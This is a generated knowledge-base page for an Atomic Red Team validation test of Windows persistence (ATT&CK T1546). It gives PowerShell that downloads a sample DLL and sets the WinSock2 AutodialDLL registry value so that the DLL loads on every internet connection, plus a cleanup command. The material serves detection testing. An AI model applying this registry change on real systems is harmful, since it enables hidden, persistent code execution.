---
atomic_guid: "aca9ae16-7425-4b6d-8c30-cad306fdbd5b"
title: "Persistence with Custom AutodialDLL"
framework: "atomic"
generated: "true"
attack_technique_id: "T1546"
attack_technique_name: "Event Triggered Execution"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546/T1546.yaml"
build_date: "2026-04-26 17:02:13"
executor: "powershell"
aliases:
  - "aca9ae16-7425-4b6d-8c30-cad306fdbd5b"
  - "Persistence with Custom AutodialDLL"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# Persistence with Custom AutodialDLL

The DLL pointed to by the AutodialDLL registry key is loaded every time a process connects to the internet. Attackers can gain persistent code execution by setting this key to a DLL of their choice. 

The sample dll provided, AltWinSock2DLL, will launch the notepad process. Starting and stopping a web browser such as MS Edge or Chrome should result in the dll executing.
[Blog](https://www.mdsec.co.uk/2022/10/autodialdlling-your-way/)

## Metadata

- Atomic GUID: aca9ae16-7425-4b6d-8c30-cad306fdbd5b
- Technique: T1546: Event Triggered Execution
- Platforms: windows
- Executor: powershell
- Elevation Required: True
- Source Path: atomics/T1546/T1546.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1546-event_triggered_execution|T1546]]

## Dependencies

AltWinSock2DLL DLL must exist on disk at specified at PathToAtomicsFolder\T1546\bin\AltWinSock2DLL.dll

### Prerequisite Check

```untitled
if (Test-Path PathToAtomicsFolder\T1546\bin\AltWinSock2DLL.dll) { exit 0} else { exit 1}
```

### Get Prerequisite

```untitled
New-Item -Type Directory "PathToAtomicsFolder\T1546\bin\" -ErrorAction ignore | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546/bin/AltWinSock2DLL.dll" -OutFile "PathToAtomicsFolder\T1546\bin\AltWinSock2DLL.dll"
```

## Executor

- elevation_required: True
- name: powershell

### Command

```powershell
Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters -Name AutodialDLL -Value PathToAtomicsFolder\T1546\bin\AltWinSock2DLL.dll
```

### Cleanup

```powershell
Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters -Name AutodialDLL -Value  $env:windir\system32\rasadhlp.dll
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546/T1546.yaml)
